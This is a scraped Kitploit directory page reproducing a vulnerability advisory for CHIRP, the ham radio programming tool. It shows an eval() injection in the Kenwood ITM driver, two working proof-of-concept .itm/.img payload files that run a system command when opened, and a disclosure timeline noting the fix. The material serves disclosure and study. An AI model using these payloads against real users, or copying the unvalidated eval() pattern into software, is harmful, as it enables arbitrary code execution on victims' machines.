@@ -1,0 +1,141 @@
+---
+title: CHIRP-CodeExecution_via_Malicious_ImageFile
+url: https://kitploit.com/en/tools/github/cduram/chirp-codeexecution_via_malicious_imagefile
+source: Kitploit
+date: 2026-08-22
+fetch_date: 2026-08-23T02:57:02.671998
+---
+
+# CHIRP-CodeExecution_via_Malicious_ImageFile
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.
+
+·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit
+
+Tool Directory
+
+## Categories
+
+[View all categories](/en/categories)
+
+Loading categories
+
+CHIRP-CodeExecution\_via\_Malicious\_ImageFile — Proof-of-concept exploit for arbitrary code execution through eval() injection in a ham radio programming application, including malicious .itm/.img file payloads and root-cause analysis. | Kitploit
+
+[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/cduram/chirp-codeexecution\_via\_malicious\_imagefile
+
+![](https://assets.kitploit.com/production/public/tools/50681/e842e0f5d3306630ab9af4a38be742094b8b8b9aa6eb50602747023e942fa617-display-v1.webp)
+
+[Vulnerability Analysis](/en/categories/vulnerability-analysis)[Exploitation](/en/categories/exploitation)[Payload Development](/en/categories/payload-development)
+
+![GitHub](/providers/github.png)cduram/chirp-codeexecution\_via\_malicious\_imagefile
+
+# CHIRP-CodeExecution\_via\_Malicious\_ImageFile
+
+Proof-of-concept exploit for arbitrary code execution through eval() injection in a ham radio programming application, including malicious .itm/.img file payloads and root-cause analysis.
+
+[View Repository](https://github.com/cduram/chirp-codeexecution_via_malicious_imagefile)
+
+### Most Popular
+
+[View all →](/en/tools)
+
+Discover the most used tools by our community.
+
+Last 7 DaysLast 30 Days
+
+Explore all tools
+
+Browse our collection of tools
+
+[View all tools →](/en/tools)
+
+Share
+
+1 day ago![Not yet reviewed](/_next/image?url=%2Fbadges%2Fkitploit_badge_not_reviewed_full.png&w=48&q=75)
+
+# CHIRP — Arbitrary Code Execution via `eval()` in Kenwood ITM Driver
+
+**Product:** CHIRP - An open-source project for programming Ham Radios.
+**Affected Versions:**
+**URL:** <https://github.com/kk7ds/chirp>, <https://chirpmyradio.com>
+**Affected Versions:** <= chirp-next-20260814
+**CWE:** CWE-95 (Eval Injection)
+
+---
+
+## Overview
+
+CHIRP's Kenwood ITM file format driver passes raw CSV field values from an opened file directly to Python's built-in `eval()` with no validation. An attacker who delivers a crafted file to a CHIRP user achieves arbitrary code execution as the victim user.
+
+## Root Cause
+
+`chirp/drivers/kenwood_itm.py`, `_clean_tmode()`, lines 66–67:
+
+root@kitploit:~
+
+```
+def _clean_tmode(self, headers, line, mem):
+    rtone = eval(generic_csv.get_datum_by_header(headers, line, "TXSIG"))  # SINK
+    ctone = eval(generic_csv.get_datum_by_header(headers, line, "RXSIG"))  # SINK
+```
+
+The TXSIG and RXSIG values come directly from a CSV row in the opened file. No type check, allowlist, or sandboxing is applied before `eval()`.
+
+## POCs
+
+Below are two POCs.
+
+### Malicious `.itm`
+
+root@kitploit:~
+
+```
+// Malicious .itm POC
+CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
+1,1,146.520000,146.520000,PoC,__import__('os').system('calc'),0
+```
+
+### Malicious `.img`
+
+root@kitploit:~
+
+```
+// Malicious .img POC
+CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
+1,0,146520000,146520000,PoC,__import__('os').system('calc.exe'),0
+
+ chirpεimgeyJyY2xhc3MiOiAiSVRNUmFkaW8iLCAidmVuZG9yIjogIktlbndvb2QiLCAibW9kZWwiOiAiSVRNIiwgInZhcmlhbnQiOiAiIiwgImNoaXJwX3ZlcnNpb24iOiAiZGFpbHktMjAyMzAxMDEifQ==
+```
+
+### Triggering in CHIRP
+
+1. Launch CHIRP.
+2. **File → Open**.
+3. Select `{file_name}.img`. *If using the .itm payload, change the filter dropdown to **"All Files"** (ITM is not filtered for in CHIRP).*
+4. Select `{file_name}.itm`.
+
+## Disclosure
+
+2026-08-17 -- Vulnerability discovered
+2026-08-17 -- E-mailed maintainer
+2026-08-17 -- Maintainer responded and code fixed the same day. <https://github.com/kk7ds/chirp/commit/39178dbfc4fece083ab9ed20286d6ae3a91a718e>
+2026-08-21 -- Installer release 20260821 includes the fix.
+
+[Download Tool](https://github.com/cduram/chirp-codeexecution_via_malicious_imagefile)
